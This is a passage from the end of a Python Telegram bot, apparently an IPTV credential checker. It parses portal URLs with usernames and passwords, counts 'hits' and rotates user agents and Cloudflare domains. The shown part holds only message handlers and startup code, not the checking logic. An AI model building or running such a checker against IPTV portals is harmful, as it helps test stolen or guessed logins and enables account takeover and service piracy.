        parse_mode=ParseMode.HTML)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "help":
        await query.message.reply_text(
            f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
            f"💡 Pega tu URL directamente o usa:\n"
            f"/check <code>portal:puerto usuario pass</code>\n\n"
            f"Formatos:\n"
            f"• <code>http://portal/get.php?username=U&amp;password=P</code>\n"
            f"• <code>portal|usuario|pass</code>\n"
            f"• <code>portal usuario pass</code>\n\n"
            f"🦂 {BOT_USERNAME}", parse_mode=ParseMode.HTML)
    elif query.data == "status":
        estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
        await query.message.reply_text(
            f"📊 <b>Estado:</b> {estado}\n"
            f"⭐ Verificados: {STATS['checks']}\n"
            f"✅ Hits: {STATS['hits']}\n"
            f"👥 Usuarios: {len(STATS['users'])}\n"
            f"🕐 {now_str()}\n\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(
            f"🔴 Bot detenido.\n🦂 {BOT_USERNAME}")
        return
    text = (update.message.text or "").strip()
    portal, user, pwd = extract_from_url(text)
    if portal and user and pwd:
        await do_check(update, portal, user, pwd)
    else:
        await update.message.reply_text(
            f"❓ No reconocí esa URL.\n\n"
            f"📌 Pega algo así:\n"
            f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
            f"O usa /help\n🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════
#  🚀 MAIN
# ══════════════════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        log.error(
            "❌ BOT_TOKEN no configurado.\n"
            "   Railway → Variables → New Variable\n"
            "   BOT_TOKEN = tu token de @BotFather")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info(f"🦂 IPTV BOT ULTRA PRO — LUIS R | TZ: {TZ_NAME}")
    log.info(f"   CF dominios: {len(CF_DOMAINS)} | UAs: {len(ALL_USER_AGENTS)}")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("stop",   cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("check",  cmd_check))
    app.add_handler(CommandHandler("debug",  cmd_debug))
    app.add_handler(CommandHandler("addcf",  cmd_addcf))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    log.info("✅ Bot listo — escuchando.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
